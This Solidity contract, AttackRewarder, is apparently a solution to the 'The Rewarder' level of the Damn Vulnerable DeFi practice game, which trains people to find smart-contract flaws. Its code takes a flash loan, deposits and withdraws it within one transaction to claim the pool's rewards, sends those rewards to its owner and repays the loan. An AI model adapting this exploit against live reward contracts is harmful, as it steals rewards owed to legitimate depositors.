// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";


contract AttackRewarder {

    FlashLoanerPool public flashPool;
    TheRewarderPool public rewardPool;
    RewardToken public token;
    DamnValuableToken public liqToken;
    address public owner;


    constructor(address _flashPool, address _rewardPool, address _token, address _liqToken) {
        flashPool = FlashLoanerPool(_flashPool);
        rewardPool = TheRewarderPool(_rewardPool);
        owner = msg.sender;
        token = RewardToken(_token);
        liqToken = DamnValuableToken(_liqToken);
    }

    function getLoan(uint _amount) external {
        flashPool.flashLoan(_amount);


    }


    function receiveFlashLoan(uint256 amount) external {
        liqToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        token.transfer(owner, token.balanceOf(address(this)));
        liqToken.transfer(address(flashPool), amount);
    }

}